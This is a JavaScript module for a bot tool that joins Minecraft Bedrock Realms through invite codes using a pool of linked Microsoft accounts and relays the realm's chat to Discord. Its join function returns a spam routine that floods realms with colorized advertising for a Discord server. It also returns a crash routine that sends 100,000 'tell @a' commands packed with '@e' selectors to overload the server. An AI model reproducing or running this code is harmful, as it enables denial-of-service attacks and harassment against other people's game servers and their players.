if (!global.debugConsole) {
    global.debugConsole = (level, message) => {
        if (level == 0) {
            console.log(`[INFO] ${message}`)
        } else if (level == 1) {
            console.log(`[WARN] ${message}`)
        } else if (level == 2) {
            console.log(`[ERROR] ${message}`)
        }
    }
}

const fs = require('fs');
const bedrock = require('bedrock-protocol');

const { Authflow: PrismarineAuth } = require('prismarine-auth')
const { RealmAPI } = require('prismarine-realms');
const path = require('path');

let accountnames = [];

let notLinked = false;
let connection;

function setConnection(conn) {
    connection = conn;

    connection.query('SELECT * FROM `accounts`', (err, rows) => {
        if (err) throw err;
        rows.forEach(row => {
            if (row.username == '') return;
            if (row.deleted) return;
            accountnames.push(row.username);
        });
        if (accountnames.length == 0) {
            global.debugConsole(2,'No accounts found in accounts table')
            notLinked = true;
        } else {
            global.debugConsole(0,`Linked ${accountnames.length} accounts`)
        }
    });
}

function runNoConnection() {
    delete require.cache[require.resolve(path.join(__dirname+'/acounts.json'))];
    const data = require(path.join(__dirname+'/acounts.json')).accounts;
    data.forEach(account => {
        if (account.username == '') return;
        if (account.deleted) return;
        accountnames.push(account.username);
    });
    if (accountnames.length == 0) {
        global.debugConsole(2,'No accounts found in accounts.json')
        notLinked = true;
    } else {
        global.debugConsole(0,`Linked ${accountnames.length} accounts`)
    }
}

const relayChannelID = '1158071383557947514'


const options = {
    authTitle: '00000000441cc96b',
    flow: 'live'
}

function randomCode() {
    const optionsString = "1234567890abcdefghjnmtups";
    const optionsArray = optionsString.split('');
    const randomIndex = Math.floor(Math.random() * optionsArray.length);
    const randomOption = optionsArray[randomIndex];
    return "§"+randomOption;
}

function colorizeText(text) {
    const words = text.split(' '); 
    const coloredWords = words.map(word => {
        const colorCode = randomCode();
        return `${colorCode}${word}`;
    });

    return coloredWords.join(' '); 
}

const profilesFolder = '/yarn/profiles';

let blocklist = [];

async function deleteAccount(accountname) {
    accountnames.splice(accountnames.indexOf(accountname), 1);
    if (connection)
        connection.query('UPDATE `accounts` SET `deleted` = 1 WHERE `username` = ?', [accountname]);
    else {
        delete require.cache[require.resolve(path.join(__dirname+'/acounts.json'))];
        const data = require(path.join(__dirname+'/acounts.json')).accounts;
        fs.writeFileSync(path.join(__dirname+'/accounts.json'), JSON.stringify({_note:"This file is automatically generated from YARN", accounts: data.filter(account=>account.username!=accountname)}));
    }
}

async function joinCode(realmCode, accountname, failCallback) {
    let spamCheck = {}
    setInterval(async () => {
        for (const xuid in spamCheck) {            
            if (spamCheck[xuid] > 4) {
                blocklist.push(xuid);
            }
        }
        spamCheck = {}
    }, 1000)
    return new Promise(async (resolve, reject) => {
        await link(accountname, ()=>{
            deleteAccount(accountname);
            return reject('Account not linked ('+accountname+'), deleted from accounts table');
        })
        let bedrockClient;
        if (typeof realmCode == 'object') {
            bedrockClient = bedrock.createClient({
                username: accountname,
                profilesFolder,
                skinData: {
                    CurrentInputMode: 3,
                    DefaultInputMode: 3,
                    DeviceModel: 'Xbox Series X',
                    DeviceOS: 13, // DO NOT CHANGE UNDER ANY CIRCUMSTANCES
                },
                skipPing: true,
                host: realmCode.host,
                port: realmCode.port,
            });
        } else if (typeof realmCode == 'string') {
            bedrockClient = bedrock.createClient({
                username: accountname,
                profilesFolder,
                skinData: {
                    CurrentInputMode: 3,
                    DefaultInputMode: 3,
                    DeviceModel: 'Xbox Series X',
                    DeviceOS: 13, // DO NOT CHANGE UNDER ANY CIRCUMSTANCES
                },
                skipPing: true,
                realms: {
                    realmInvite: realmCode,
                }
            });
        } else {
            reject('Invalid realmCode');
        }

        // this is to catch any errors that may occur
        function en(err) {
            process.removeListener('uncaughtException', en);
            if (err=="Error: Your account currently does not have an Xbox profile. Please create one at https://signup.live.com/signup") {
                deleteAccount(accountname);
                return reject("Account presumed dead ("+accountname+"), deleted from accounts table");
            }
            if (err.toString().includes('Error:')) err = err.toString().split(' ').slice(3).join(' ');
            try {
                err = JSON.parse(err);
                if (err.errorMsg)
                    reject(err.errorMsg);
                else if (err.error) {
                    deleteAccount(accountname);
                    return reject("Account presumed dead ("+accountname+"), deleted from accounts table");
                } else
                    reject(err);
            } catch (e) {
                console.log(e)
            }            
        }
        process.on('uncaughtException', en);

        
        bedrockClient.on('join', () => {
            console.log(`Connecting To Realm ${realmCode} as ${accountname}`);
        })
        
        bedrockClient.on('text', (packet) => {
            if (blocklist.includes(packet.xuid)) return;
            if (packet.xuid=='') return;
            if (packet.type==='chat') {
                if (packet.source_name) {
                    console.log(`[${realmCode}]: <${packet.source_name}> ${packet.message}`);
                    if (spamCheck[packet.xuid]) {
                        spamCheck[packet.xuid]++
                    } else {
                        spamCheck[packet.xuid] = 1
                    }
                    // if global.client is defined, send message to discord
                    if (global.client) {
                        let message = packet.message.replace(/§[0-9a-z]/g, '');
                        messsage = message.replace('@', '\\@');
                        message = message.replace('/', '\\');
                        global.client.channels.cache.get(client.config.relay).send(`[${realmCode}]: <${packet.source_name}> ${message}`);
                    }
                }
            } if (packet.type==='translation') {
                // '§e%multiplayer.player.left.realms'
                // '§e%multiplayer.player.joined.realms'
                if (packet.message==='§e%multiplayer.player.joined.realms') {
                    console.log(`[${realmCode}]: ${packet.parameters[0]} joined the realm`);
                    if (global.client) 
                        global.client.channels.cache.get(client.config.relay).send(`[${realmCode}]: ${packet.parameters[0]} joined the realm`);
                } else if (packet.message==='§e%multiplayer.player.left.realms') {
                    console.log(`[${realmCode}]: ${packet.parameters[0]} left the realm`);
                    if (global.client)
                        global.client.channels.cache.get(client.config.relay).send(`[${realmCode}]: ${packet.parameters[0]} left the realm`);
                } 
            }
        });

        let disconnected = false;

        bedrockClient.on('start_game', () => {
            console.log(`Joined Realm ${realmCode} as ${accountname}`);
            // waits 3 seconds to make sure the client is fully loaded
            setTimeout(() => {
                if (!disconnected) {
                }
            }, 3000);
            resolve(bedrockClient);
        });
        
        bedrockClient.on('close', (packet) => {
            console.log('Connection closed to realm '+realmCode+' as '+accountname);
            console.log(packet)
            if (disconnected) return;
            disconnected = true;
            failCallback({ msg: "Close event triggered", error: true, disconnect_reason: "close" });
        });

        bedrockClient.on('disconnect', (packet) => {
            console.log(`Disconnected From Realm ${realmCode} as ${accountname}`);
            disconnected = true;
            let message = packet.message;
            // replaces %disconnect.kicked.reason to Kicked for reason
            if (message.includes('%disconnect.kicked.reason')) {
                message = message.replace('%disconnect.kicked.reason', 'Kicked for reason:');
            }
            reject(`${message}`);
            failCallback({ msg: message, error: true, disconnect_reason: "disconnect" });
        });
    })
}

async function updateAccounts() {
    accountnames = [];
    if (connection == undefined) {
        delete require.cache[require.resolve(path.join(__dirname+'/acounts.json'))];
        const data = require(path.join(__dirname+'/acounts.json')).accounts;
        data.forEach(account => {
            if (account.username == '') return;
            if (account.deleted) return;
            accountnames.push(account.username);
        });
    } else {
        connection.query('SELECT * FROM `accounts`', (err, rows) => {
            if (err) throw err;
            rows.forEach(row => {
                if (row.username == '') return;
                if (row.deleted) return;
                accountnames.push(row.username);
            });
        });
    }
}

async function join(realmCode, maxClients = 1, leaveCallback) {
    accountnames = accountnames.sort(() => Math.random() - 0.5);
    return new Promise(async (resolve, reject) => {
        if (notLinked) return reject('No accounts are linked');
        const mcClients = []
        const errors = []
        
        let failedClients = 0;

        for (let i = 0; i < accountnames.length; i++) {
            if (mcClients.length >= maxClients) break;
            const accountname = accountnames[i];
            try {
                console.log("Trying to connect to "+realmCode+" as "+accountname)
                const mcClient = await joinCode(realmCode, accountname, leaveCallback).catch(e=>{throw e});
                console.log("Connected to "+realmCode+" as "+accountname)
                mcClients.push(mcClient);
            } catch(e) {
                failedClients++;
                global.debugConsole(1, e);
                errors.push(e);
                if (e=="Invalid link") {
                    reject({msg:e, errors});
                    break;
                }
                console.log(`Failed to connect to ${realmCode} as ${accountname}`);
            }
        }
            
        function spam(inputText, amount) {
            for (let i = 0; i < amount; i++) {
                mcClients.forEach(client=>client.write('command_request', {
                    command: `me ${colorizeText(inputText)} | discord.gg/antip2w`,
                    origin: {
                        type: 5,
                        uuid: '',
                        request_id: '',
                    },
                    internal: false,
                    version: 66,
                }));
            }
        }
        
        function crash() {
            for (let i = 0; i < 100000; i++) {
                mcClients.forEach(client=>client.write('command_request', {
                    command: `tell @a §l§c§k${"@e".repeat(60)} | discord.gg/antip2w`,
                    origin: {
                        type: 5,
                        uuid: '',
                        request_id: '',
                    },
                    internal: false,
                    version: 66,
                }));
            }
        }
        
        function playsound() {
            mcClients.forEach(client=>client.write('level_sound_effect', {
                soundId:"Thunder",

            }));
        }

        function leave() {
            mcClients.forEach(client=>client.disconnect());
            leaveCallback({ msg: 'Left realm', error: false});
        }   

        // waits until mcClients is populated
        const interval = setInterval(() => {
            if (mcClients.length+failedClients == accountnames.length && mcClients.length > 0 || mcClients.length >= maxClients) {
                clearInterval(interval);
                resolve({ mcClients, spam, crash, leave, playsound, failedClients, errors });
            } else if (mcClients.length+failedClients == accountnames.length && mcClients.length == 0) {
                clearInterval(interval);
                reject({msg: 'Failed to join any accounts', errors});
            }
        }, 1);
    })
}

async function crashLoop(time) {
            
}

async function realmLookup(realmCode) {    
    return new Promise(async (resolve, reject) => {
        if (notLinked) return reject('No accounts are linked');
        function en(err) {
            if (err.toString().includes('Error:')) err = err.toString().split(' ').slice(3).join(' ');
            // json parse the rest
            try {
                err = JSON.parse(err);
    
                reject(err.errorMsg);
            } catch (e) {}
            // reject the promise
            process.removeListener('uncaughtException', en);
        }
        process.on('uncaughtException', en);

        const authflow = new PrismarineAuth(accountnames[0], profilesFolder, options)
        
        const api = RealmAPI.from(authflow, 'bedrock')
    
        let realm = await api.getRealmFromInvite(realmCode)
        console.log(realm)
        if (!realm) throw Error('Couldn\'t find a Realm to connect to. Authenticated account must be the owner or has been invited to the Realm.')
    
        const { host, port} = await realm.getAddress()
        const realmName = realm.name
        resolve({ host, port, realmName });
    })
}
async function realmLookupByID(realmID) {    
    return new Promise(async (resolve, reject) => {
        if (notLinked) return reject('No accounts are linked');
        function en(err) {
            if (err.toString().includes('Error:')) err = err.toString().split(' ').slice(3).join(' ');
            // json parse the rest
            try {
                err = JSON.parse(err);
    
                reject(err.errorMsg);
            } catch (e) {}
            // reject the promise
            process.removeListener('uncaughtException', en);
        }
        process.on('uncaughtException', en);

        const authflow = new PrismarineAuth(accountnames[0], profilesFolder, options)
        
        const api = RealmAPI.from(authflow, 'bedrock')
    
        let realm = await api.getRealmAddress(realmID)
    
        if (!realm) throw Error('Couldn\'t find a Realm to connect to. Authenticated account must be the owner or has been invited to the Realm.')
    
        const { host, port } = realm
        resolve({ host, port });
    })
}
async function getPlayerCount(realmID) {
    const authflow = new PrismarineAuth(accountnames[0], profilesFolder, options);
    const api = RealmAPI.from(authflow, 'bedrock');

    try {
        const realm = await api.getRealmFromInvite(realmID);
        console.log(realm)
        const players = await realm.getPlayers();
        console.log(players)
        return players.length;
    } catch (error) {
        console.error(error);
        return 0; // Return 0 in case of an error
    }
}
async function getAllRealms(accountname = accountnames[0]) {    
    return new Promise(async (resolve, reject) => {
        if (notLinked) return reject('No accounts are linked');
        function en(err) {
            if (err.toString().includes('Error:')) err = err.toString().split(' ').slice(3).join(' ');
            // json parse the rest
            try {
                err = JSON.parse(err);
    
                reject(err.errorMsg);
            } catch (e) {}
            // reject the promise
            process.removeListener('uncaughtException', en);
        }
        process.on('uncaughtException', en);

        const authflow = new PrismarineAuth(accountname, profilesFolder, options)
        
        const api = RealmAPI.from(authflow, 'bedrock')
    
        let realms = await api.getRealms()
    
        if (!realms) throw Error('Couldn\'t find a Realm to connect to. Authenticated account must be the owner or has been invited to the Realm.')
        resolve(realms);
    })
}  

// returns microsoft msa link code
async function link(username, callback) {
    return new Promise(async (resolve, reject) => {
        function en(err) {
            if (err.toString().includes('Error:')) err = err.toString().split(' ').slice(3).join(' ');
            // json parse the rest
            try {
                err = JSON.parse(err);
    
                reject(err.errorMsg);
            } catch (e) {}
            // reject the promise
            process.removeListener('uncaughtException', en);
        }
        process.on('uncaughtException', en);
        
        let authed = false;
        const authflow = new PrismarineAuth(username, profilesFolder, options, (code) => {
            callback(code.user_code);
            authed = true;
        })
        try {
            await authflow.getMsaToken();
        } catch (e) {
            reject(e);
            console.log(e)
        }
        resolve('logged in as '+username)
        // writes accounts.json name
        if (authed) {
            if (!connection) {
                delete require.cache[require.resolve(path.join(__dirname+'/acounts.json'))];
                const data = require(path.join(__dirname+'/acounts.json')).accounts;
                fs.writeFileSync(path.join(__dirname+'/accounts.json'), JSON.stringify({_note:"This file is automatically generated from YARN", accounts: data.concat({username, deleted: 0})}));
            } else {
                connection.query('INSERT INTO `accounts` (`username`, `deleted`) VALUES (?, ?)', [username, 0]);
            }
            global.debugConsole(0,`Linked ${username} to accounts table`)
            notLinked = false;
        }
    })
}

module.exports = {
    join,
    realmLookup,
    realmLookupByID,
    getAllRealms,
    link,
    updateAccounts,
    setConnection,
    runNoConnection,
    getPlayerCount
}
